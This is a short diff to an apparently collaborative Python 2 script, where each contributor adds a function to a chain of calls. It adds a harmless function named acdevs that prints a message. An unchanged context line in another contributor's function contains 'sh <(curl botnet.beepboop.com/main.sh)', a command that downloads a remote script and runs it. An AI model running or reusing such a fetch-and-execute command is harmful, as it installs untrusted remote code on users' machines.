@@ -370,6 +370,9 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
+        
+def acdevs():
+    print "Lost in the echo!! from acdevs.."
 
 if __name__ == "__main__":
     heinzf() # this thing makes it hard to make sure stuff works, doesn't it?
@@ -414,6 +417,7 @@ if __name__ == "__main__":
     hazirguo()
     chris911()
     doboy(doboy)
+    acdevs()
 
     # as per instructed, please leave this as the final function
     lafin()
